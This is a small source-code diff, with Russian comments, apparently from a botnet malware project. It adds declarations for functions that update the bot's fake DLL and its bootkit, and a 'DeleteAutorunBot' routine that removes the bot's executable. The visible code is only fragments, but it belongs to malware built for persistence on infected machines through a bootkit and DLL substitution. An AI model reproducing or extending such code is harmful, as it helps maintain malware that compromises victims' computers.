@@ -26,10 +26,12 @@ namespace COREDEBUGSTRINGS
 //---------------------------------------------------------------------------
 
 
-//если компилится bot.plug, то функция его удаления находится в файле main.cpp его проекта
+//если компилится bot.plug, то функции его удаления и объявления находятся в файле main.cpp его проекта
 //для остальных проектов такое удаление не нужно
 #ifdef BOTPLUG
 	extern bool FakeDllDelete();
+	bool UpdateBotFakeDll( BYTE* data, int c_data );
+	bool UpdateBotBootkit( BYTE* data, int c_data );
 #endif
 
 
@@ -954,6 +956,13 @@ void BOT::Delete()
 			SendProcessMessage(ProcessService, Cmd);
 		}
 	}
+}
+
+void BOT::DeleteAutorunBot()
+{
+	char* fileName = BOT::GetBotFullExeName();
+	DeleteBotFile(fileName);
+	STR::Free(fileName);
 }
 //----------------------------------------------------------------------------
 
